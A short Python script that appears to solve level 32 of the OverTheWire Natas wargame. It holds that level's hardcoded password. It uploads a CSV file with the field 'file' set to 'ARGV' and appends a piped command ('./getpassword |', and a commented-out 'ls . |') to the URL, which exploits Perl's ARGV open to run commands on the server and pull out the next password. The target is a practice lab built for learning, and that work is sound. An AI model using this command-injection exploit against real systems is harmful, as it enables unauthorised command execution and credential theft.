#!/usr/bin python

import re
import requests
import os.path
from requests.auth import HTTPBasicAuth

password = 'no1vohsheCaiv3ieH4em1ahchisainge'
session = requests.Session()

auth = HTTPBasicAuth('natas32', password)
url = 'http://natas32.natas.labs.overthewire.org/'
# payload = url + '?ls . |'

# if not os.path.exists('natas32.csv'):
#     with open('natas32.csv', 'w') as f:
#         f.write('temp,file')

# csv = {'file': open('natas32.csv', 'rb')}

# resp = requests.post(payload, files=csv, data={'file': 'ARGV', 'submit': 'Upload'}, auth=auth)
# page = resp.text

# if os.path.isfile('natas32.csv'):
#     os.remove('natas32.csv')

# print(page)

payload = url + '?./getpassword |'

if not os.path.exists('natas32.csv'):
    with open('natas32.csv', 'w') as f:
        f.write('temp,file')

csv = {'file': open('natas32.csv', 'rb')}

resp = requests.post(payload, files=csv, data={'file': 'ARGV', 'submit': 'Upload'}, auth=auth)
page = resp.text

if os.path.isfile('natas32.csv'):
    os.remove('natas32.csv')

passwd = re.findall("([a-zA-Z0-9]{32})", page)
print(passwd[-1])